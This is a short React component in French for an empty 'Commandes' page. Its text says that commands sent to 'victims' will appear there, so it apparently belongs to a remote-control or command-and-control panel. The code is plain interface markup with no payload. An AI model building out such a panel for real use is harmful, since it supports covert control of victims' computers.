import React from 'react';
import { Typography, Box, Paper } from '@mui/material';
import { Terminal as TerminalIcon } from '@mui/icons-material';

const CommandsPage = () => {
    return (
        <Box>
            <Typography variant="h4" component="h1" gutterBottom>
                Commandes
            </Typography>
            <Paper sx={{ p: 3, minHeight: '60vh', display: 'flex', flexDirection: 'column', justifyContent: 'center', alignItems: 'center' }}>
                <TerminalIcon sx={{ fontSize: 64, color: 'text.secondary', mb: 2 }} />
                <Typography variant="h6" color="text.secondary" align="center">
                    Aucune commande en attente.
                </Typography>
                <Typography variant="body2" color="text.secondary" align="center">
                    Les commandes envoyées aux victimes apparaîtront ici.
                </Typography>
            </Paper>
        </Box>
    );
};

export default CommandsPage;